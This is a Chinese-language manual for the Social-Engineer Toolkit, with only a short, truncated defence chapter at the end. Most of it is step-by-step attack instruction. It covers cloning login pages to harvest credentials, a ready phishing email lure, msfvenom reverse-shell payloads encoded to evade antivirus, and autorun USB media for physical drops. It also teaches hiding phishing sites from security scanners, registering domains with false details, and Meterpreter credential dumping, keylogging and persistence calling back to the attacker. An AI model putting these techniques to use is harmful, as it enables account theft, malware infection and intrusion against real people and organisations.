# SET工具完整实战指南

> **文档定位**：Social-Engineer Toolkit 完整使用手册与实战指南
> **前置知识**：Linux基础、Python基础、网络安全基础、社会工程学基础
> **风险提示**：本文档仅用于授权范围内的安全测试与研究，严禁用于非法用途

---

## 第1章 SET（Social-Engineer Toolkit）概述

### 1.1 SET工具介绍与安装

#### 1.1.1 SET工具简介

Social-Engineer Toolkit（简称SET）是由TrustedSec公司的David Kennedy（别名ReL1K）开发的一款开源社会工程学工具框架。SET是目前世界上最流行、功能最全面的社工攻击工具包，被全球安全从业者、渗透测试人员和红队人员广泛使用。

SET的设计理念是将复杂的社工攻击技术封装成简单易用的模块化工具，让安全人员能够快速搭建社工攻击环境，从而更高效地进行安全评估和意识培训。

**SET的主要特点：**

- **模块化设计**：SET采用模块化架构，每种攻击类型都是一个独立的模块，方便调用和扩展
- **功能全面**：涵盖了网站钓鱼、邮件钓鱼、恶意文件生成、传染性媒体、无线攻击等多种社工向量
- **高度可定制**：几乎所有模块都支持自定义配置，满足不同场景的需求
- **与Metasploit无缝集成**：SET与Metasploit Framework深度整合，可以直接生成Meterpreter Payload并建立监听
- **持续更新**：作为一个活跃的开源项目，SET不断更新新的攻击技术和绕过方法
- **跨平台支持**：主要基于Linux开发，也支持在Windows、macOS等平台运行

**SET的主要应用场景：**

- 企业安全意识培训中的钓鱼演练
- 渗透测试中的社工向量评估
- 红队评估中的初始访问获取
- 安全研究与教学演示

#### 1.1.2 SET的安装

**（1）Kali Linux安装**

SET在Kali Linux中是预装的，但版本可能不是最新的。可以通过以下命令确认和更新：

```bash
# 检查SET是否已安装
which setoolkit

# 启动SET
setoolkit

# 更新到最新版本
apt update && apt install set
```

**（2）源码安装（推荐）**

对于需要最新版本或自定义修改的用户，推荐从GitHub直接克隆源码安装：

```bash
# 克隆仓库
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit/

# 运行安装脚本
chmod +x setup.py
python3 setup.py install

# 安装依赖
pip3 install -r requirements.txt
```

**（3）依赖说明**

SET的运行依赖以下软件和库：

- Python 3.x（SET v8.0及以后版本全面迁移到Python 3）
- Metasploit Framework（用于Payload生成和监听）
- Apache/Nginx（用于网站钓鱼）
- Sendmail/Postfix或第三方SMTP服务（用于发送钓鱼邮件）
- PyQt4/5（图形界面支持，可选）

**验证安装：**

```bash
# 启动SET
setoolkit
```

如果看到SET的启动画面和菜单，说明安装成功。

#### 1.1.3 SET的首次配置

第一次启动SET时，需要进行一些基本配置：

```text
[---] The Social-Engineer Toolkit (SET) [---]
[---]        Created by: David Kennedy (ReL1K)        [---]
[---]        Version: 8.0.3                           [---]
[---]        Codename: 'Reluctant to surrender'      [---]
[---]        Follow us on Twitter: @TrustedSec       [---]
[---]        Website: https://www.trustedsec.com     [---]

   Welcome to the Social-Engineer Toolkit (SET).
   The one stop shop for all of your SE needs.

   Join us at: https://discord.gg/ttn4UfY
   
   The Social-Engineer Toolkit is a product of TrustedSec, LLC
   
   Options:
    1) Social-Engineering Attacks
    2) Penetration Testing (Fast-Track)
    3) Third Party Modules
    4) Update the Social-Engineer Toolkit
    5) Update SET configuration
    6) Help, Credits, and About
    
   99) Exit the Social-Engineer Toolkit
```

**SET配置文件位于：** `/etc/setoolkit/set.config`（系统安装）或 `config/set_config`（源码安装）

常用的配置项：

```
# METASPLOIT路径
METASPLOIT_PATH=/usr/share/metasploit-framework

# Apache路径
APACHE_DIRECTORY=/etc/apache2

# 自动接受SSL证书
AUTOACCEPT_SSL_CERTIFICATE=ON

# 接口监听地址
SETINTERFACE=0.0.0.0
```

### 1.2 SET架构与模块体系

#### 1.2.1 SET的整体架构

SET采用分层架构，从顶层菜单到具体的攻击模块，层层递进：

```
SET主菜单
├── 1. Social-Engineering Attacks（社工攻击）
│   ├── 1. Spear-Phishing Attack Vectors（鱼叉式钓鱼）
│   ├── 2. Website Attack Vectors（网站攻击向量）
│   ├── 3. Infectious Media Generator（传染性媒体生成器）
│   ├── 4. Create a Payload and Listener（Payload与监听器）
│   ├── 5. Mass Mailer Attack（批量邮件攻击）
│   ├── 6. Arduino-Based Attack Vector（Arduino攻击向量）
│   ├── 7. Wireless Access Point Attack Vector（无线AP攻击向量）
│   ├── 8. QRCode Generator Attack Vector（二维码攻击向量）
│   ├── 9. Powershell Attack Vectors（PowerShell攻击向量）
│   └── 10. Third Party Modules（第三方模块）
├── 2. Penetration Testing (Fast-Track)（快速渗透测试）
├── 3. Third Party Modules（第三方模块）
├── 4. Update SET（更新SET）
├── 5. Update SET configuration（更新配置）
└── 6. Help, Credits, and About（帮助信息）
```

#### 1.2.2 核心模块详解

**（1）Spear-Phishing Attack Vectors（鱼叉式钓鱼攻击向量）**
- 功能：针对特定目标发送定制化钓鱼邮件
- 特点：支持邮件模板定制、附件Payload生成、多目标管理
- 用途：定向钓鱼攻击、BEC攻击模拟

**（2）Website Attack Vectors（网站攻击向量）**
- 功能：克隆网站、搭建钓鱼页面、窃取凭证
- 特点：支持Java Applet、Metasploit Browser Exploit、Credential Harvester、Tabnabbing等多种攻击方式
- 用途：网站钓鱼、凭证窃取、浏览器漏洞利用

**（3）Infectious Media Generator（传染性媒体生成器）**
- 功能：生成带自动运行功能的U盘/光盘镜像
- 特点：利用Autorun功能，在目标插入媒体时自动执行Payload
- 用途：物理社工、水坑攻击配合

**（4）Mass Mailer Attack（批量邮件攻击）**
- 功能：向大量目标发送钓鱼邮件
- 特点：支持单个目标、批量目标列表、多种邮件发送方式
- 用途：大规模钓鱼演练、普通钓鱼攻击模拟

**（5）Powershell Attack Vectors（PowerShell攻击向量）**
- 功能：生成PowerShell攻击Payload
- 特点：利用PowerShell的强大功能，绕过传统安全防护
- 用途：Windows环境下的社工攻击配合

**（6）Wireless Access Point Attack Vector（无线AP攻击向量）**
- 功能：创建恶意无线热点
- 特点：伪造可信WiFi，诱导目标连接后进行攻击
- 用途：物理社工场景下的无线攻击

#### 1.2.3 SET的工作原理

SET的核心工作原理可以概括为：

1. **用户交互选择**：通过交互式菜单，用户选择攻击类型和参数
2. **Payload生成**：根据用户选择，调用Metasploit或内置工具生成恶意Payload
3. **攻击环境搭建**：自动配置Web服务器、邮件服务器等攻击基础设施
4. **攻击执行**：发送钓鱼邮件、启动钓鱼网站、等待目标上钩
5. **结果收集**：收集窃取的凭证、获取的Shell等攻击结果

### 1.3 环境配置与依赖

#### 1.3.1 Metasploit集成配置

SET与Metasploit的集成是其核心功能之一。确保Metasploit正确配置非常重要。

**配置步骤：**

```bash
# 1. 确认Metasploit已安装
which msfconsole

# 2. 初始化Metasploit数据库（可选但推荐）
msfdb init

# 3. 在SET配置文件中设置Metasploit路径
vim /etc/setoolkit/set.config
# 找到 METASPLOIT_PATH 行，设置为正确路径
# METASPLOIT_PATH=/usr/share/metasploit-framework

# 4. 验证集成
# 在SET中选择"Create a Payload and Listener"，看是否能正常生成Payload
```

**常见问题：**
- 如果找不到msfpayload或msfcli命令，可能是Metasploit版本较新（已弃用这些命令），SET会自动使用msfvenom替代
- 如果出现权限问题，确保运行SET的用户有Metasploit的执行权限

#### 1.3.2 邮件服务配置

钓鱼邮件功能需要配置SMTP服务器。

**方案一：使用Sendmail/Postfix（本地邮件服务器）**

```bash
# 安装Sendmail
apt install sendmail

# 启动服务
service sendmail start

# 测试发送
echo "test" | mail -s "test" your@email.com
```

**方案二：使用第三方SMTP服务（推荐）**

使用Gmail、Outlook等第三方SMTP服务，送达率更高。

Gmail SMTP配置示例：
- SMTP服务器：smtp.gmail.com
- 端口：587（TLS）或465（SSL）
- 用户名：你的Gmail地址
- 密码：应用专用密码（需要开启两步验证）

注意：Gmail对批量邮件有限制，不适合大规模钓鱼。

**方案三：使用企业邮件服务器**

如果有自己的域名和邮件服务器，送达率和可信度最高。

#### 1.3.3 Web服务配置

网站钓鱼功能需要Web服务器支持。SET内置了简单的HTTP服务器，但生产环境推荐使用Apache或Nginx。

**Apache配置：**

```bash
# 安装Apache
apt install apache2

# 启用必要的模块
a2enmod rewrite
a2enmod ssl

# 启动服务
service apache2 start

# 设置SET的Apache路径
# 在set.config中设置 APACHE_DIRECTORY=/etc/apache2
```

---

## 第2章 钓鱼攻击模块详解

### 2.1 网站钓鱼攻击（Website Attack Vectors）

网站攻击向量是SET中最常用、最强大的模块之一。它提供了多种基于网站的社工攻击方式，从简单的凭证窃取到复杂的浏览器漏洞利用。

#### 2.1.1 网站攻击向量菜单

进入SET后，依次选择：
```
1) Social-Engineering Attacks
2) Website Attack Vectors
```

进入网站攻击向量菜单：

```text
   The Social-Engineer Toolkit "Website Attack Vectors"

   Select from the menu:

   1. Java Applet Attack Method
   2. Metasploit Browser Exploit Method
   3. Credential Harvester Attack Method
   4. Tabnabbing Attack Method
   5. Web Jacking Attack Method
   6. Multi-Attack Web Method
   7. Full Screen Attack Method
   8. HTA Attack Method

  99. Return to Main Menu
```

#### 2.1.2 Credential Harvester Attack Method（凭证窃取攻击）

凭证窃取攻击是最常用的网站钓鱼方式——克隆一个目标网站的登录页面，当目标输入用户名和密码时，凭证会被SET捕获。

**工作原理：**
1. SET克隆目标网站的登录页面
2. 修改表单的提交地址，指向SET的监听脚本
3. 当目标输入凭证并提交时，SET记录凭证信息
4. （可选）将目标重定向到真实网站，减少被怀疑的概率

**操作步骤：**

```
1. 选择 "Credential Harvester Attack Method"
2. 选择克隆方式：
   1. Web Templates - 使用预置模板
   2. Site Cloner - 克隆指定网站
   3. Custom Import - 导入自定义页面
3. 设置IP地址（攻击机的IP或域名）
4. 如果选择Site Cloner，输入要克隆的网站URL
5. 等待SET启动Web服务
```

**Site Cloner实战示例：**

假设我们要克隆一个企业邮箱登录页面：

```text
set:webattack>3

[*] Credential harvester will allow you to utilize the clone capabilities within SET
[*] to harvest credentials or parameters from a website as well as place them into a report

...

   1. Web Templates
   2. Site Cloner
   3. Custom Import

  99. Return to Webattack Menu

set:webattack>2

[*] SET supports both POST and GET as well as HTTPS for the site cloner.
[*] If you want to SET to use HTTPS you need to answer yes to the next question.
[*] Example: https://www.google.com (for HTTPS)

[*] Do you want to use HTTPS for the server (yes/no): no

[*] Enter the URL to clone: https://mail.target-company.com/

[*] Social Engineer Toolkit Credential Harvester Web Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:
```

此时SET已经启动了Web服务器，监听80端口。当目标访问攻击机的IP地址时，会看到与目标邮箱几乎一模一样的登录页面。

**捕获凭证：**

当目标在钓鱼页面中输入用户名和密码并点击登录后，SET会显示捕获到的信息：

```text
[*] WE GOT A HIT! Printing the output:
PARAM: login_email=victim@target-company.com
PARAM: password=Password123!

[*] WHEN THE USER SUBMITS THE FORM IT WILL BE POSTED TO THE FOLLOWING:
[*] POST URL: https://mail.target-company.com/login

[*] POSSIBLE USERNAME FIELD FOUND: login_email=victim@target-company.com
[*] POSSIBLE PASSWORD FIELD FOUND: password=Password123!

[*] ALSO... VISITOR: victim_ip_address
[*] COOKIES: sessionid=abc123...
```

**凭证存储位置：**
SET会将捕获的凭证保存在以下位置：
- `/root/.set/reports/` 目录下
- 文件名格式：`[时间戳]_credential_harvester.xml`
- 同时会生成HTML格式的报告

#### 2.1.3 Web Templates（内置模板）

SET内置了一些常用网站的钓鱼模板，适合快速使用。

**内置模板包括：**
- Gmail
- Facebook
- Twitter
- Yahoo
- LinkedIn
- 等等

使用内置模板的优点：
- 快速部署，不需要输入URL
- 模板经过优化，兼容性好
- 表单字段识别准确

使用内置模板的缺点：
- 模板数量有限，不一定符合目标场景
- 外观与真实网站可能有细微差别
- 容易被有经验的用户识别

#### 2.1.4 Site Cloner高级技巧

**（1）HTTPS支持**
SET支持HTTPS的钓鱼网站，这大大提高了钓鱼的可信度。

配置HTTPS：
```text
[*] Do you want to use HTTPS for the server (yes/no): yes
```

SET会自动生成自签名证书。但自签名证书会触发浏览器的安全警告，因此在实战中建议使用合法的SSL证书（可以用Let's Encrypt免费申请）。

**（2）POST/GET自动检测**
SET的Site Cloner会自动检测目标网站的表单提交方式（POST或GET），并相应地调整钓鱼页面。

**（3）重定向设置**
默认情况下，目标提交凭证后会被重定向到原始网站。这可以减少目标的怀疑——目标输入密码后发现自己又回到了登录页面，可能以为是自己输错了密码，而不会意识到是钓鱼。

**（4）处理复杂登录页面**
对于有验证码、两步验证等复杂机制的登录页面，Site Cloner的效果可能不理想。这时需要：
- 手动修改克隆的页面代码
- 使用Custom Import功能导入定制化的钓鱼页面
- 或者考虑其他攻击向量

### 2.2 Java Applet攻击

Java Applet攻击是一种经典的浏览器攻击方式，利用Java Applet的安全机制来执行恶意代码。

注意：由于现代浏览器和操作系统对Java的安全限制越来越严格，Java Applet攻击的成功率已经大幅下降。但在一些老旧环境中仍然有效。

#### 2.2.1 Java Applet攻击原理

Java Applet攻击的工作原理：
1. SET搭建一个包含恶意Java Applet的网页
2. 当目标访问网页时，浏览器会提示是否运行Java Applet
3. 如果目标点击"运行"（很多用户会不假思索地点击），Applet就会在目标系统上执行Payload
4. Payload通常是Meterpreter或其他后门，建立反向连接到攻击机

#### 2.2.2 操作步骤

```
1. 选择 "Java Applet Attack Method"
2. 选择网站模板类型（Web Templates / Site Cloner / Custom Import）
3. 设置攻击机IP地址
4. 选择Payload类型：
   1. Windows Shell Reverse_TCP
   2. Windows Reverse_TCP Meterpreter
   3. Windows Reverse_TCP VNC DLL
   4. Windows Shell Reverse_TCP X64
   5. Windows Meterpreter Reverse_TCP X64
   ...（更多选项）
5. 设置监听端口（默认443）
6. SET启动Web服务和Metasploit监听器
```

#### 2.2.3 Applet签名

默认情况下，SET使用自签名的Java Applet，运行时会显示安全警告。为了提高成功率，可以使用合法的代码签名证书对Applet进行签名。

虽然购买代码签名证书需要一定成本，但在高价值目标的攻击中，这是值得的投资。

### 2.3 证书钓鱼攻击

#### 2.3.1 SSL证书与钓鱼网站的可信度

浏览器地址栏的锁标志和HTTPS前缀对用户有很强的心理暗示作用——用户普遍认为"有锁的网站就是安全的"。因此，为钓鱼网站配置合法的SSL证书，可以大大提高钓鱼的成功率。

#### 2.3.2 获取免费SSL证书

使用Let's Encrypt可以免费获取SSL证书：

```bash
# 安装certbot
apt install certbot

# 获取证书（需要有域名并配置DNS）
certbot certonly --standalone -d phishing-domain.com

# 证书文件位置
# /etc/letsencrypt/live/phishing-domain.com/fullchain.pem
# /etc/letsencrypt/live/phishing-domain.com/privkey.pem
```

#### 2.3.3 在SET中使用自定义SSL证书

SET默认使用自签名证书。要使用自定义证书，需要手动配置：

1. 将证书文件放置到合适的位置
2. 修改SET的Web服务配置
3. 使用Apache/Nginx反向代理（推荐）

**使用Apache反向代理的方案：**

```apache
<VirtualHost *:443>
    ServerName phishing-domain.com
    
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/phishing-domain.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/phishing-domain.com/privkey.pem
    
    ProxyPass / http://127.0.0.1:8080/
    ProxyPassReverse / http://127.0.0.1:8080/
</VirtualHost>
```

这样，外部访问走Apache的HTTPS，内部转发到SET的HTTP服务，既保证了安全性，又不需要修改SET的代码。

### 2.4 多攻击向量Web攻击（Multi-Attack Web Method）

Multi-Attack Web Method是SET中的高级功能，它允许在同一个网站攻击中同时启用多种攻击方式，提高成功率。

#### 2.4.1 功能介绍

Multi-Attack Web Method可以组合以下攻击方式：
- Java Applet攻击
- Metasploit浏览器漏洞利用
- 凭证窃取攻击
- Tabnabbing攻击
- Web Jacking攻击

当目标访问钓鱼网站时，SET会依次尝试不同的攻击方式，只要其中一种成功，就能获取目标系统的访问权限。

#### 2.4.2 适用场景

- 目标环境复杂，不确定哪种攻击方式会成功
- 目标价值高，值得投入更多资源提高成功率
- 红队评估中需要模拟真实APT攻击的多向量攻击

---

## 第3章 社工攻击向量

### 3.1 钓鱼邮件攻击（Mass Mailer Attack）

批量邮件攻击（Mass Mailer Attack）是SET中用于发送钓鱼邮件的模块。它支持单个目标和批量目标，可以发送纯文本邮件或带恶意附件的邮件。

#### 3.1.1 Mass Mailer菜单

```
1. E-Mail Attack Single Email Address
   （单个目标邮件攻击）
   
2. E-Mail Attack Mass Mailer
   （批量邮件攻击）
   
3. Create a Mass Mailer Template
   （创建批量邮件模板）
```

#### 3.1.2 单个目标邮件攻击

适用于鱼叉式钓鱼——针对单个高价值目标发送高度定制化的钓鱼邮件。

**操作步骤：**

```
1. 选择 "E-Mail Attack Single Email Address"
2. 选择是否使用社工模板（推荐使用，格式更好）
3. 输入目标邮箱地址：victim@target.com
4. 选择邮件优先级（一般选择普通优先级）
5. 输入发件人姓名：IT Department
6. 输入发件人邮箱：it-support@company.com
7. 输入邮件主题：Password Expiration Notice
8. 输入邮件正文（可以用BODY来结束输入）
9. 选择是否带附件（如果有恶意附件，选择yes）
10. 如果带附件，选择附件类型和路径
11. 选择发送方式：
    1. 使用Sendmail
    2. 使用Gmail
    3. 使用自己的SMTP服务器
```

#### 3.1.3 批量邮件攻击

适用于大规模钓鱼演练——向大量目标发送钓鱼邮件。

**操作步骤：**

```
1. 选择 "E-Mail Attack Mass Mailer"
2. 输入目标邮箱列表文件路径（每行一个邮箱）
3. 后续步骤与单个目标类似
```

**目标列表示例：**
```
user1@target.com
user2@target.com
user3@target.com
...
```

#### 3.1.4 邮件发送方式对比

| 发送方式 | 优点 | 缺点 | 适用场景 |
|---------|------|------|---------|
| **Sendmail** | 配置简单，免费 | 容易被标记为垃圾邮件，送达率低 | 测试环境 |
| **Gmail/Outlook** | 送达率较高 | 有发送数量限制，容易被封号 | 小规模测试 |
| **自建SMTP服务器** | 可控性强，可配置SPF/DKIM | 需要域名和服务器，配置复杂 | 中大型钓鱼演练 |
| **第三方邮件服务** | 送达率高，功能完善 | 付费，需要审核 | 企业级钓鱼演练 |

### 3.2 恶意文件生成

SET集成了Metasploit的Payload生成功能，可以快速生成各种类型的恶意文件。

#### 3.2.1 Payload类型

SET支持生成多种Payload类型：

**Windows平台：**
- Windows Shell Reverse_TCP：反向TCP Shell
- Windows Reverse_TCP Meterpreter：反向TCP Meterpreter（最常用）
- Windows Reverse_TCP VNC DLL：反向VNC
- Windows Bind Shell：绑定Shell
- Windows Meterpreter Reverse HTTPS：通过HTTPS的Meterpreter（更隐蔽）
- Windows Shell Reverse_TCP X64：64位反向Shell
- Windows Meterpreter Reverse_TCP X64：64位Meterpreter

**Linux平台：**
- Linux Shell Reverse_TCP
- Linux Meterpreter Reverse_TCP

**其他平台：**
- PHP Meterpreter Reverse_TCP
- Java/JSP Meterpreter
- Python Meterpreter

#### 3.2.2 创建Payload和监听器

```
1. 从SET主菜单选择 "Social-Engineering Attacks"
2. 选择 "Create a Payload and Listener"
3. 选择Payload类型（如 2 - Windows Reverse_TCP Meterpreter）
4. 输入攻击机IP地址
5. 输入监听端口（默认443）
6. SET生成Payload并启动msfconsole监听器
```

生成的Payload文件位于：
- `/root/.set/payload.exe` 或类似路径

#### 3.2.3 编码与免杀

默认生成的Payload很容易被杀毒软件检测到。SET提供了一些编码选项来尝试绕过杀毒软件：

**使用msfvenom手动编码（更灵活）：**

```bash
# 生成基础Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=443 -f exe -o payload_raw.exe

# 使用shikata_ga_nai编码（多次编码）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe
```

注意：仅靠编码已经很难绕过现代EDR/XDR产品，需要结合更高级的免杀技术（如Shellcode注入、进程空洞、无文件攻击等）。

### 3.3 传染性媒体生成

传染性媒体生成器（Infectious Media Generator）用于创建带自动运行功能的U盘或光盘镜像，当目标将媒体插入电脑时，恶意程序会自动运行。

#### 3.3.1 工作原理

传染性媒体利用Windows的Autorun（自动运行）功能。当USB设备插入电脑时，Windows会读取设备根目录下的`autorun.inf`文件，并按照其中的指令自动执行程序。

注意：从Windows 7开始，微软已经默认禁用了USB设备的Autorun功能，但在某些旧系统或特定配置下仍然有效。此外，通过社会工程学诱导用户手动运行也是常见的手段。

#### 3.3.2 操作步骤

```
1. 从SET主菜单选择 "Social-Engineering Attacks"
2. 选择 "Infectious Media Generator"
3. 选择Payload类型
4. 输入攻击机IP和端口
5. 选择是否使用Autorun功能
6. SET生成镜像文件
```

生成的文件包括：
- `autorun.inf`：自动运行配置文件
- `payload.exe`：恶意程序
- `program.exe`：伪装的正常程序（可选）

#### 3.3.3 高级技巧

**（1）文件伪装**
- 将恶意程序命名为诱人的名字，如"工资单.exe"、"机密文档.exe"
- 使用图标伪装（如文件夹图标、Word文档图标）
- 开启"隐藏已知文件类型的扩展名"（需要目标系统设置）

**（2）搭配社工话术**
在U盘上贴标签，如"机密-2024年度预算"、"员工福利方案"等，诱导目标插入电脑查看。

**（3）物理投放**
将U盘丢在目标公司的停车场、电梯间、洗手间等地方，总有人会捡起来插到电脑上看看。这是经典的物理社工+技术攻击组合。

---

## 第4章 快速部署实战

### 4.1 克隆网站钓鱼实战

本节通过一个完整的实战案例，演示如何使用SET快速搭建一个克隆网站的钓鱼攻击。

#### 4.1.1 场景设定

- **目标**：某公司的企业邮箱登录页面
- **目标人群**：该公司的员工
- **攻击目的**：获取员工的邮箱账号密码
- **攻击方式**：克隆邮箱登录页面，通过钓鱼邮件诱导员工访问

#### 4.1.2 准备工作

**攻击机环境：**
- 操作系统：Kali Linux 2024.x
- SET版本：8.0.3
- IP地址：192.168.1.100（实战中应为公网IP）
- 域名：mail.target-login.com（仿冒域名，可选）

**情报收集：**
- 目标公司邮箱登录地址：https://mail.target-company.com/
- 目标公司员工邮箱列表（通过OSINT收集）

#### 4.1.3 实施步骤

**第一步：启动SET**

```bash
setoolkit
```

**第二步：选择攻击向量**

```
  1) Social-Engineering Attacks
  set> 1

  2) Website Attack Vectors
  set:social_engineering> 2

  3) Credential Harvester Attack Method
  set:webattack> 3

  2) Site Cloner
  set:webattack> 2
```

**第三步：配置攻击参数**

```
[*] Do you want to use HTTPS for the server (yes/no): no

[*] Enter the URL to clone: https://mail.target-company.com/

[*] Enter the IP address or URL for the POST back in Harvester/Tabnabbing: 192.168.1.100
```

**第四步：等待目标上钩**

SET会启动Web服务并输出：

```
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:
```

**第五步：发送钓鱼邮件**

（可以使用SET的Mass Mailer功能，或手动/用其他工具发送）

钓鱼邮件示例：
```
主题：邮箱密码即将过期，请及时更新

尊敬的员工：

您好！

公司邮箱系统将于本周末进行安全升级。
为确保您的邮箱正常使用，请在今天内点击以下链接验证您的账号：

http://192.168.1.100/

如果您在24小时内未完成验证，您的邮箱账号将被临时锁定。

感谢您的配合！

IT部门
```

**第六步：捕获凭证**

当目标点击链接并输入账号密码后，SET会显示：

```
[*] WE GOT A HIT! Printing the output:
PARAM: email=zhangsan@target-company.com
PARAM: password=Zh@ngsan2024

[*] POSSIBLE USERNAME FIELD FOUND: email=zhangsan@target-company.com
[*] POSSIBLE PASSWORD FIELD FOUND: password=Zh@ngsan2024
[*] ALSO... VISITOR: 192.168.1.50
```

### 4.2 凭据Harvesting实战

#### 4.2.1 多页面凭证窃取

有些网站的登录流程是多步骤的（比如先输入用户名，下一页再输入密码）。SET的Credential Harvester可以处理这种情况吗？

答案是：默认情况下，SET只处理单页面的表单提交。对于多步骤登录，需要手动处理。

**手动处理多步骤登录的方法：**

1. 使用Site Cloner克隆第一个页面（输入用户名）
2. 找到SET生成的页面文件（通常在/var/www/html/或SET目录下）
3. 修改第一个页面，将表单提交到第二个钓鱼页面
4. 克隆第二个页面（输入密码）
5. 配置第二个页面将数据提交到SET的捕获脚本

#### 4.2.2 凭证数据管理

SET捕获的凭证数据存储在XML文件中，可以通过以下方式管理：

**查看报告：**
```bash
cd /root/.set/reports/
ls -la
# 找到最新的凭证报告文件
cat *.xml
```

**导出为CSV（方便分析）：**
```python
import xml.etree.ElementTree as ET
import csv

tree = ET.parse('credential_harvester.xml')
root = tree.getroot()

with open('credentials.csv', 'w', newline='') as f:
    writer = csv.writer(f)
    writer.writerow(['IP', 'Username', 'Password', 'Timestamp'])
    
    for hit in root.findall('.//hit'):
        ip = hit.find('ip').text
        username = ''
        password = ''
        for param in hit.findall('.//param'):
            if 'user' in param.get('name', '').lower() or 'email' in param.get('name', '').lower():
                username = param.text
            if 'pass' in param.get('name', '').lower():
                password = param.text
        timestamp = hit.find('timestamp').text if hit.find('timestamp') is not None else ''
        writer.writerow([ip, username, password, timestamp])
```

### 4.3 钓鱼页面定制与优化

默认的克隆页面可能存在各种问题，需要进行定制和优化才能达到最佳效果。

#### 4.3.1 常见问题与修复

**（1）页面样式错乱**
- 原因：克隆时CSS、图片等资源没有正确下载或路径错误
- 修复：手动下载缺失的资源，修正页面中的路径

**（2）表单提交失败**
- 原因：目标网站有复杂的JavaScript验证或动态表单
- 修复：分析目标网站的表单提交逻辑，修改钓鱼页面

**（3）重定向不自然**
- 原因：目标提交后跳转到真实网站的方式太突兀
- 修复：添加加载动画，模拟"登录中"的效果，然后再跳转

#### 4.3.2 钓鱼页面优化技巧

**（1）添加"安全"标志**
- 模拟浏览器的地址栏安全锁图标
- 添加"安全登录"、"加密传输"等 reassuring 文字
- 注意：这是欺骗性手段，仅用于授权测试

**（2）模拟错误提示**
- 第一次提交后显示"密码错误"，让目标再输入一次
- 这样可以捕获两次输入，提高密码准确性（因为第一次可能输错）
- 同时也更像真实的登录体验

**（3）添加验证码**
- 如果真实网站有验证码，钓鱼页面最好也模拟一个
- 验证码图片可以是固定的或随机生成的，反正不需要真的验证
- 目的是让页面看起来更真实

#### 4.3.3 移动设备适配

越来越多的用户通过手机访问邮件和网站。钓鱼页面需要针对移动设备进行优化。

优化要点：
- 确保页面在手机屏幕上显示正常
- 表单输入框要足够大，方便触摸输入
- 按钮要醒目，容易点击
- 避免使用Flash等手机不支持的技术

---

## 第5章 高级技巧

### 5.1 绕过WAF/安全检测

随着安全技术的发展，钓鱼邮件和钓鱼网站越来越容易被检测到。红队人员需要掌握各种绕过技巧。

#### 5.1.1 钓鱼邮件绕过

**（1）内容规避**
- 避免使用典型的钓鱼关键词（如"密码"、"验证"、"紧急"等）
- 使用更自然、更个性化的语言
- 图片代替文字（将关键内容做成图片，避免内容检测）

**（2）HTML混淆**
- 对HTML代码进行混淆和编码
- 使用CSS和JavaScript动态生成内容
- 将恶意链接拆分成多段，用JavaScript拼接

**（3）附件免杀**
- 使用宏代码混淆
- 使用不常见的文件格式（如ISO、IMG、LNK等）
- 密码保护的压缩包（密码写在邮件正文中）

#### 5.1.2 钓鱼网站绕过

**（1）域名技巧**
- 使用IDN（国际化域名）同形字攻击（如用西里尔字母а代替拉丁字母a）
- 使用子域名仿冒（如target-company.verify-account.com）
- 使用相似拼写的域名（typosquatting）

**（2）内容伪装**
- 对来自安全厂商IP的访问显示正常内容
- 检测User-Agent，如果是爬虫/扫描器则返回正常页面
- 只在特定时间段显示钓鱼内容

**（3）链接混淆**
- 使用URL短链接服务
- 使用Open Redirect跳转到钓鱼页面
- 将钓鱼链接嵌在合法网站的URL参数中

### 5.2 钓鱼域名与证书配置

专业的钓鱼攻击需要专业的域名和证书配置。

#### 5.2.1 域名选择策略

**（1）域名仿冒类型**

| 类型 | 示例 | 说明 |
|------|------|------|
| **拼写错误** | taarget.com、taget.com | 利用打字错误 |
| **添加前后缀** | target-login.com、my-target.com | 添加相关词汇 |
| **顶级域替换** | target.net、target.org | 替换TLD |
| **同形异义字** | targét.com、tаrget.com | 相似字符替换 |
| **子域名仿冒** | target.verify-account.com | 在其他域名下建子域名 |
| **同音不同字** | （中文场景） | 利用同音字 |

**（2）域名注册注意事项**
- 使用隐私保护服务（WhoisGuard等）隐藏注册信息
- 不要用真实信息注册域名
- 选择信誉好的域名注册商
- 考虑使用抗审查的域名注册商（如Njalla）

#### 5.2.2 SSL证书获取

**（1）Let's Encrypt免费证书**
- 完全免费
- 自动化申请和续期
- 浏览器信任度高
- 适合大多数钓鱼场景

**（2）付费证书**
- EV证书（显示公司名称）可信度最高，但审核严格，难以用虚假信息申请
- OV和DV证书相对容易获取
- 对于高价值目标，可以考虑购买

### 5.3 与Metasploit联动

SET和Metasploit的深度集成是其强大之处。本节介绍一些高级联动技巧。

#### 5.3.1 Meterpreter后渗透

当通过SET获取了Meterpreter会话后，可以进行各种后渗透操作：

**常用Meterpreter命令：**

```
# 系统信息
sysinfo
getuid
getsystem  # 尝试提权

# 凭证窃取
hashdump
load mimikatz
kerberos

# 网络侦察
ipconfig
route
arp

# 键盘记录
keyscan_start
keyscan_dump
keyscan_stop

# 截屏
screenshot

# 摄像头
webcam_list
webcam_snap

# 文件操作
ls
cd
download
upload

# 权限维持
run persistence
```

#### 5.3.2 自动化后渗透脚本

SET和Metasploit结合，可以实现自动化的后渗透：

**使用Resource脚本自动化：**

创建一个`post_exploit.rc`文件：
```
getsystem
hashdump
run persistence -U -i 60 -p 443 -r 攻击机IP
screenshot
keyscan_start
```

然后在msfconsole中加载：
```
msf> resource post_exploit.rc
```

#### 5.3.3 多目标管理

当通过钓鱼攻击获取了大量Meterpreter会话时，需要有效的管理方法：

```
# 查看所有会话
sessions -l

# 与特定会话交互
sessions -i 1

# 在所有会话中执行命令
sessions -C "sysinfo"

# 后台运行会话
background
```

---

## 第6章 防御与检测

了解攻击是为了更好地防御。本章从防御角度介绍如何检测和防范SET攻击。

### 6.1 SET攻击检测方法

#### 6.1.1 钓鱼网站检测

**（1）域名检测**
- 监控与公司域名相似的新注册域名
- 使用域名监控工具（如DomainTools、NameBio等）
- 建立仿冒域名黑名单

**（2）内容检测**
- 定期搜索公司名称+关键字（如"登录"、"邮箱"），查找钓鱼网站
- 使用图片反向搜索，查找使用公司logo的钓鱼网站
